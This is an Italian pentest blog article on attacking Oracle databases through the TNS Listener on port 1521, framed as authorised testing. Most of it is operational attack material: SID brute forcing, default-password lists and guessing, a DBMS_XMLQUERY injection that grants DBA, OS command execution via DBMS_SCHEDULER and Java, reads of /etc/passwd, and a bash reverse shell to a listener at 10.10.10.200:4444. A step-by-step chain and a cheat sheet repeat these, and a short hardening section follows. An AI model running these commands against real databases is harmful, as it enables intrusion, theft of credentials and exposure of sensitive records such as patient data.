---
title: 'Porta 1521 Oracle DB: TNS Listener, SID e Privilege Escalation'
slug: porta-1521-oracle
description: 'Pentest Oracle 1521: enumerazione TNS Listener, payload, SID e service name, test credenziali deboli, SQL injection, escalation a DBA e lateral movement in lab.'
image: /porta-1521-oracle.webp
draft: true
date: 2026-04-11T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - oracle
  - tns listener
---

Oracle Database è il database enterprise per eccellenza: banche, assicurazioni, ospedali, governi, multinazionali — ovunque ci siano dati critici e budget consistente, c'è Oracle. Ascolta sulla porta 1521 TCP tramite il **TNS Listener** (Transparent Network Substrate), il servizio che gestisce le connessioni client. Nel penetration testing, Oracle è uno dei target più preziosi e complessi: la superficie di attacco è enorme (migliaia di package PL/SQL, decine di default account, listener esposto), i dati sono quasi sempre ad altissimo valore (finanziario, sanitario, governativo) e le installazioni legacy con versioni non patchate sono la norma in ambienti enterprise.

La complessità di Oracle è anche la sua debolezza: ci sono così tanti componenti, così tanti account di default, così tanti package con funzionalità pericolose che i DBA faticano a tenere tutto sotto controllo. In quasi ogni pentest enterprise che ho fatto, Oracle è stato o l'entry point o il target finale — e raramente mi ha deluso.

Un caso che mi è rimasto impresso: un ospedale del centro Italia con Oracle 12c esposto sulla rete interna. L'account `DBSNMP` (Oracle monitoring) aveva ancora la password di default `dbsnmp`. Da lì, privilege escalation a DBA tramite un package PL/SQL vulnerabile, poi OS command execution via `DBMS_SCHEDULER` → shell sul server. Il database conteneva la cartella clinica completa di 200.000 pazienti. La password non era mai stata cambiata dall'installazione del 2016.

## Cos'è il TNS Listener — Il Portiere di Oracle

Il TNS Listener è il processo che ascolta sulla porta 1521 e instrada le connessioni ai database Oracle. Un singolo listener può gestire più database (istanze), ognuno identificato da un **SID** (Service ID) o **Service Name**. Per connetterti a Oracle, devi conoscere: IP, porta, e SID o service name.

```
Client (sqlplus, odat)        TNS Listener (:1521)         Oracle Instance
┌──────────────────┐         ┌──────────────────┐          ┌────────────────┐
│ Connect to       │──TNS───►│ Listener         │          │ SID: ORCL      │
│ SID: ORCL        │         │  ├── ORCL ───────┼────────►│  Users: HR,    │
│ User: SCOTT      │         │  ├── PROD ───────┼────┐    │  Finance,      │
│ Pass: tiger      │         │  └── TEST ───────┼──┐ │    │  Admin...      │
│                  │◄────────│                  │  │ │    └────────────────┘
│                  │ Data    │                  │  │ │    ┌────────────────┐
└──────────────────┘         └──────────────────┘  │ └───►│ SID: PROD      │
                                                   │      └────────────────┘
                                                   │      ┌────────────────┐
                                                   └─────►│ SID: TEST      │
                                                          └────────────────┘
```

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 1521 10.10.10.40
```

```
PORT     STATE SERVICE VERSION
1521/tcp open  oracle-tns  Oracle TNS Listener 19.0.0.0.0
```

```bash
# Script Nmap per Oracle
nmap -p 1521 --script oracle-tns-version,oracle-sid-brute,oracle-brute 10.10.10.40
```

### Versione del Listener

```bash
# Con tnscmd (tool specifico per TNS)
tnscmd10g version -h 10.10.10.40 -p 1521

# Con odat
odat tnscmd -s 10.10.10.40 -p 1521 --version
```

```
TNSLSNR for Linux: Version 19.0.0.0.0 - Production
```

### SID Enumeration — Il Primo Step Obbligatorio

Per connetterti a Oracle devi conoscere il SID. Esistono diversi modi per trovarlo:

```bash
# Metodo 1: Brute force SID con odat
odat sidguesser -s 10.10.10.40 -p 1521

# Metodo 2: Nmap
nmap -p 1521 --script oracle-sid-brute 10.10.10.40

# Metodo 3: Metasploit
use auxiliary/scanner/oracle/sid_enum
set RHOSTS 10.10.10.40
run

# Metodo 4: Hydra
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 10.10.10.40 oracle-sid
```

SID comuni:

| SID    | Contesto                     |
| ------ | ---------------------------- |
| `ORCL` | Default Oracle               |
| `XE`   | Oracle Express               |
| `PROD` | Produzione                   |
| `TEST` | Test                         |
| `DEV`  | Sviluppo                     |
| `HR`   | Human Resources              |
| `FIN`  | Finance                      |
| `ERP`  | Enterprise Resource Planning |

### Listener Status (se non protetto)

```bash
# Richiedi lo status del listener (spesso restituisce i SID)
tnscmd10g status -h 10.10.10.40 -p 1521
```

```
Connecting to (DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=10.10.10.40)(PORT=1521)))
Services Summary...
Service "ORCL" has 1 instance(s).
  Instance "ORCL", status READY, has 1 handler(s) for this service...
Service "PROD" has 1 instance(s).
  Instance "PROD", status READY, has 1 handler(s) for this service...
```

Due SID scoperti senza autenticazione: `ORCL` e `PROD`.

## 2. Default Credentials

Oracle ha una storia impressionante di account con password di default. Ecco i più comuni:

| Username | Password            | Ruolo                         |
| -------- | ------------------- | ----------------------------- |
| `SYS`    | `change_on_install` | DBA (sysdba)                  |
| `SYSTEM` | `manager`           | DBA                           |
| `SCOTT`  | `tiger`             | Standard (classico dal 1977!) |
| `DBSNMP` | `dbsnmp`            | Monitoring                    |
| `OUTLN`  | `outln`             | Schema outline                |
| `MDSYS`  | `mdsys`             | Spatial data                  |
| `CTXSYS` | `ctxsys`            | Oracle Text                   |
| `HR`     | `hr`                | Sample schema                 |
| `OE`     | `oe`                | Order Entry sample            |
| `XDB`    | `xdb`               | XML DB                        |

```bash
# Test massivo con odat
odat passwordguesser -s 10.10.10.40 -p 1521 -d ORCL --accounts-file /usr/share/odat/accounts/accounts.txt
```

```bash
# Con Metasploit
use auxiliary/scanner/oracle/oracle_login
set RHOSTS 10.10.10.40
set SID ORCL
run
```

```bash
# Test manuale con sqlplus
sqlplus SCOTT/tiger@10.10.10.40:1521/ORCL
sqlplus SYS/change_on_install@10.10.10.40:1521/ORCL as sysdba
sqlplus DBSNMP/dbsnmp@10.10.10.40:1521/ORCL
```

### Brute force

```bash
# Hydra
hydra -L oracle_users.txt -P oracle_passwords.txt -s 1521 10.10.10.40 oracle-listener

# Nmap
nmap -p 1521 --script oracle-brute --script-args oracle-brute.sid=ORCL 10.10.10.40
```

## 3. Post-Autenticazione — Enumerazione Database

Con qualsiasi credenziale valida:

```sql
-- Versione completa
SELECT banner FROM v$version;

-- Utenti del database
SELECT username, account_status, default_tablespace FROM dba_users;

-- Utenti con DBA role
SELECT grantee FROM dba_role_privs WHERE granted_role = 'DBA';

-- Tabelle accessibili
SELECT owner, table_name FROM all_tables ORDER BY owner;

-- Tabelle con "password" nel nome
SELECT owner, table_name FROM all_tables WHERE table_name LIKE '%PASSWORD%' OR table_name LIKE '%CREDENTIAL%' OR table_name LIKE '%USER%';

-- Colonne con dati sensibili
SELECT owner, table_name, column_name FROM all_tab_columns
WHERE column_name LIKE '%PASS%' OR column_name LIKE '%SECRET%' OR column_name LIKE '%TOKEN%';

-- Link a database remoti (lateral movement)
SELECT db_link, username, host FROM dba_db_links;

-- Directory Oracle (path del filesystem)
SELECT directory_name, directory_path FROM all_directories;
```

I **database link** sono oro: contengono credenziali per connettersi ad altri database Oracle nella rete → lateral movement istantaneo.

## 4. Privilege Escalation — Da Utente a DBA

### Method 1: Package PL/SQL vulnerabili

Oracle ha centinaia di package PL/SQL built-in con procedure che possono essere sfruttate per escalation:

```sql
-- Verifica i permessi attuali
SELECT * FROM user_role_privs;
SELECT * FROM user_sys_privs;

-- Se hai EXECUTE su DBMS_XMLQUERY (CVE-2009-1979)
SELECT DBMS_XMLQUERY.NEWCONTEXT('declare PRAGMA AUTONOMOUS_TRANSACTION; begin EXECUTE IMMEDIATE ''GRANT DBA TO SCOTT''; end;') FROM dual;

-- Verifica
SELECT * FROM user_role_privs;  -- Ora dovrebbe mostrare DBA
```

### Method 2: Java Stored Procedure escalation

Se Java è installato nel database:

```sql
-- Verifica se Java è disponibile
SELECT * FROM v$option WHERE parameter = 'Java';

-- Grant Java permissions
BEGIN
  DBMS_JAVA.GRANT_PERMISSION('SCOTT', 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
  DBMS_JAVA.GRANT_PERMISSION('SCOTT', 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
  DBMS_JAVA.GRANT_PERMISSION('SCOTT', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'read,write,execute');
END;
/
```

### Method 3: con odat (automatizzato)

```bash
# odat tenta automaticamente l'escalation
odat privesc -s 10.10.10.40 -p 1521 -d ORCL -U SCOTT -P tiger --sysdba --dba-with-execute
```

## 5. OS Command Execution

Una volta DBA, puoi eseguire comandi sul sistema operativo:

### DBMS\_SCHEDULER (metodo più affidabile)

```sql
-- Crea un job che esegue un comando OS
BEGIN
    DBMS_SCHEDULER.CREATE_JOB(
        job_name => 'OS_CMD',
        job_type => 'EXECUTABLE',
        job_action => '/bin/bash',
        number_of_arguments => 2,
        enabled => FALSE
    );
    DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('OS_CMD', 1, '-c');
    DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('OS_CMD', 2, 'id > /tmp/pwned.txt');
    DBMS_SCHEDULER.ENABLE('OS_CMD');
END;
/
```

### Java OS Command (se Java è abilitato)

```sql
-- Crea una funzione Java per eseguire comandi
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "OSCMD" AS
import java.io.*;
public class OSCMD {
    public static String exec(String cmd) throws Exception {
        Runtime rt = Runtime.getRuntime();
        Process p = rt.exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line; StringBuilder sb = new StringBuilder();
        while((line = br.readLine()) != null) sb.append(line).append("\n");
        return sb.toString();
    }
};
/

CREATE OR REPLACE FUNCTION os_cmd(cmd IN VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA NAME 'OSCMD.exec(java.lang.String) return java.lang.String';
/

-- Esegui
SELECT os_cmd('id') FROM dual;
SELECT os_cmd('cat /etc/passwd') FROM dual;
```

### Reverse shell via odat

```bash
odat externaltable -s 10.10.10.40 -p 1521 -d ORCL -U SYS -P change_on_install --sysdba --exec /bin/bash "-c 'bash -i >& /dev/tcp/10.10.10.200/4444 0>&1'"
```

### File Read/Write

```sql
-- Leggi un file dal filesystem (richiede CREATE DIRECTORY)
CREATE OR REPLACE DIRECTORY HACKDIR AS '/etc';
GRANT READ ON DIRECTORY HACKDIR TO SCOTT;

DECLARE
    f UTL_FILE.FILE_TYPE;
    buf VARCHAR2(4000);
BEGIN
    f := UTL_FILE.FOPEN('HACKDIR', 'passwd', 'R');
    UTL_FILE.GET_LINE(f, buf);
    DBMS_OUTPUT.PUT_LINE(buf);
    UTL_FILE.FCLOSE(f);
END;
/
```

```bash
# Con odat (più semplice)
odat utlfile -s 10.10.10.40 -p 1521 -d ORCL -U SYS -P pass --sysdba --getFile /etc passwd /tmp/passwd_dump.txt
```

## 6. Metasploit Modules

```bash
# Login brute
use auxiliary/scanner/oracle/oracle_login

# SID enum
use auxiliary/scanner/oracle/sid_enum

# TNS listener version
use auxiliary/scanner/oracle/tnslsnr_version

# OS command execution (post-auth)
use exploit/multi/oracle/oracle_java_deserialization_rce

# SQL injection
use auxiliary/sqli/oracle/dbms_cdc_ipublish
```

## 7. Micro Playbook Reale

**Minuto 0-3 → Fingerprint e SID**

```bash
nmap -sV -p 1521 --script oracle-tns-version TARGET
odat sidguesser -s TARGET -p 1521
```

**Minuto 3-10 → Default credentials**

```bash
odat passwordguesser -s TARGET -p 1521 -d SID_TROVATO --accounts-file accounts.txt
```

**Minuto 10-15 → Login e enumerazione**

```bash
sqlplus USER/PASS@TARGET:1521/SID
# → SELECT banner FROM v$version;
# → SELECT grantee FROM dba_role_privs WHERE granted_role='DBA';
# → SELECT db_link, username, host FROM dba_db_links;
```

**Minuto 15-25 → Privilege escalation se non sono DBA**

```bash
odat privesc -s TARGET -p 1521 -d SID -U USER -P PASS --dba-with-execute
```

**Minuto 25+ → OS command execution e data extraction**

```bash
odat externaltable -s TARGET -p 1521 -d SID -U SYS -P pass --sysdba --exec /bin/bash "-c 'id'"
# Dump dati sensibili via sqlplus
```

## 8. Caso Studio Concreto

**Settore:** Ospedale, 800 dipendenti, centro Italia.

**Scope:** Pentest interno, credenziale standard sulla rete.

La scansione della rete ha rivelato la porta 1521 su un server classificato come "database clinico". `odat sidguesser` ha trovato il SID `HISDB` (Hospital Information System). Ho testato le credenziali di default — `DBSNMP:dbsnmp` funzionava.

L'account `DBSNMP` aveva privilegi limitati, ma con `odat privesc` ho sfruttato un package PL/SQL con `EXECUTE` grant per elevarmi a DBA. Da DBA, ho trovato 3 database link ad altri Oracle nella rete (laboratorio analisi, farmacia, pronto soccorso) con credenziali in chiaro. Con OS command execution via `DBMS_SCHEDULER` ho ottenuto una shell come `oracle` sul server, e dal `listener.ora` ho estratto le password di altri 2 listener.

Il database `HISDB` conteneva: anamnesi, diagnosi, terapie, referti di laboratorio di 200.000 pazienti. I database link mi hanno dato accesso a prescrizioni farmacologiche e risultati di laboratorio su altri 3 server.

**Tempo dalla scansione alla shell:** 35 minuti. **Root cause:** Password di default `DBSNMP:dbsnmp` mai cambiata dall'installazione del 2016.

## 9. Errori Comuni Reali Trovati nei Pentest

**1. Default credentials non cambiate (60%+ delle installazioni Oracle)**
`DBSNMP:dbsnmp`, `SCOTT:tiger`, `SYS:change_on_install` funzionano ancora in una percentuale impressionante di installazioni enterprise. Oracle crea decine di account di default e i DBA ne cambiano solo 2-3.

**2. Listener non protetto**
Il TNS Listener risponde a `STATUS` e `VERSION` senza autenticazione, rivelando SID, versione e path di installazione. In Oracle 9i/10g il listener non aveva password di default — chiunque poteva fermarlo con `STOP`.

**3. Database link con credenziali in chiaro**
I database link (`dba_db_links`) contengono username e password per connettersi ad altri database. Spesso le credenziali sono di DBA remoti → lateral movement istantaneo tra database.

**4. Java abilitato senza necessità**
Java nel database estende enormemente la superficie di attacco (file I/O, network I/O, OS command execution). Molte installazioni lo hanno abilitato di default e non lo usano.

**5. Nessuna segregazione di rete per il listener**
La porta 1521 raggiungibile da tutta la rete interna — o peggio, da Internet. Oracle Database dovrebbe essere raggiungibile solo dai server applicativi.

**6. Versioni non patchate**
Le CPU (Critical Patch Updates) di Oracle escono ogni trimestre. In ambiente enterprise, vedo regolarmente database con 2-3 anni di patch mancanti per paura di "rompere qualcosa".

## 10. Mini Chain Offensiva Reale

```
TNS :1521 → SID Enum → Default Creds → Priv Esc → DBA → DB Links → Lateral Movement → OS Shell
```

**Step 1 — Trova SID**

```bash
odat sidguesser -s 10.10.10.40 -p 1521
# → ORCL, PROD
```

**Step 2 — Default credentials**

```bash
odat passwordguesser -s 10.10.10.40 -p 1521 -d PROD
# → DBSNMP:dbsnmp (valid)
```

**Step 3 — Privilege escalation a DBA**

```bash
odat privesc -s 10.10.10.40 -p 1521 -d PROD -U DBSNMP -P dbsnmp --dba-with-execute
# → DBA role granted
```

**Step 4 — Enumerazione database link**

```sql
SELECT db_link, username, password, host FROM dba_db_links;
-- → FINANCE_LINK, FINANCE_DBA, Fin@nce2020!, fin-db01:1521/FIN
-- → HR_LINK, HR_ADMIN, HrAdmin2019!, hr-db01:1521/HRDB
```

**Step 5 — Lateral movement**

```bash
sqlplus FINANCE_DBA/Fin@nce2020!@fin-db01:1521/FIN
# → Accesso al database finanziario
# → SELECT * FROM transactions WHERE amount > 100000;
```

**Step 6 — OS shell dal database principale**

```bash
odat externaltable -s 10.10.10.40 -p 1521 -d PROD -U DBSNMP -P dbsnmp --sysdba --exec /bin/bash "-c 'bash -i >& /dev/tcp/10.10.10.200/4444 0>&1'"
```

Da un singolo `DBSNMP:dbsnmp` → DBA → 3 database → shell → accesso a dati finanziari e HR.

## 11. Detection & Hardening

* **Cambia TUTTE le password di default** — script Oracle per verificarle: `SELECT username FROM dba_users_with_defpwd;`
* **Blocca il listener** — `ADMIN_RESTRICTIONS_LISTENER=ON` nel `listener.ora`
* **Password sul listener** — `PASSWORDS_LISTENER=(password)` nel `listener.ora`
* **Revoca EXECUTE su package pericolosi** — `DBMS_XMLQUERY`, `UTL_FILE`, `DBMS_SCHEDULER` dagli utenti non-DBA
* **Disabilita Java** se non necessario — `DROP JAVA SOURCE`
* **Rimuovi database link** non necessari o cifra le credenziali
* **Firewall** — 1521 accessibile solo dai server applicativi
* **Patch** — applica le CPU trimestrali
* **Audit** — abilita Oracle Database Vault e Unified Auditing
* **Segregazione** — database di produzione isolati dalla rete utente

## 12. Mini FAQ

**Oracle ha molti account di default?**
Sì — a seconda della versione e dei componenti installati, Oracle può avere **decine** di account con password di default. La query `SELECT username FROM dba_users_with_defpwd;` li elenca tutti. È il primo comando da eseguire dopo l'installazione (e durante il pentest).

**Posso ottenere una shell OS dal database?**
Sì, se sei DBA. I metodi principali: `DBMS_SCHEDULER` con job di tipo EXECUTABLE, Java Stored Procedure con `Runtime.exec()`, e external table con preprocessor. odat automatizza tutto.

**Qual è la differenza tra SID e Service Name?**
Il SID è il nome dell'istanza del database (es: ORCL). Il Service Name è il nome logico del servizio (es: orcl.corp.local). In Oracle 12c+ con i container database, il Service Name è più usato. Per il pentest, prova entrambi nella connection string: `user/pass@host:1521/SID` vs `user/pass@host:1521/ServiceName`.

## 13. Cheat Sheet Finale

| Azione         | Comando                                                                    |
| -------------- | -------------------------------------------------------------------------- |
| Nmap           | `nmap -sV -p 1521 --script oracle-tns-version,oracle-sid-brute target`     |
| SID guess      | `odat sidguesser -s target -p 1521`                                        |
| TNS version    | `tnscmd10g version -h target -p 1521`                                      |
| TNS status     | `tnscmd10g status -h target -p 1521`                                       |
| Default creds  | `odat passwordguesser -s target -p 1521 -d SID`                            |
| sqlplus        | `sqlplus USER/PASS@target:1521/SID`                                        |
| sqlplus sysdba | `sqlplus SYS/pass@target:1521/SID as sysdba`                               |
| Priv esc       | `odat privesc -s target -p 1521 -d SID -U user -P pass --dba-with-execute` |
| OS cmd         | `odat externaltable ... --exec /bin/bash "-c 'cmd'"`                       |
| File read      | `odat utlfile ... --getFile /etc passwd /tmp/out.txt`                      |
| DB links       | `SELECT db_link,username,host FROM dba_db_links;`                          |
| Default pwd    | `SELECT username FROM dba_users_with_defpwd;`                              |
| DBA check      | `SELECT grantee FROM dba_role_privs WHERE granted_role='DBA';`             |
| MSF login      | `use auxiliary/scanner/oracle/oracle_login`                                |
| MSF SID        | `use auxiliary/scanner/oracle/sid_enum`                                    |

***

Riferimento: Oracle Security Guide, ODAT documentation, OWASP Oracle Testing, HackTricks Oracle. Uso esclusivo in ambienti autorizzati. 

Leggi anche questo articolo molto operativo: [https://www.verylazytech.com/network-pentesting/oracle-tns-listener-port-1521-1522-1529](https://www.verylazytech.com/network-pentesting/oracle-tns-listener-port-1521-1522-1529)

> I tuoi database Oracle hanno ancora le password di default del 2016? I database link contengono credenziali in chiaro verso altri server? [Penetration test Oracle HackIta](https://hackita.it/servizi) per scoprirlo. Per l'exploitation enterprise database: [formazione 1:1 avanzata](https://hackita.it/formazione).
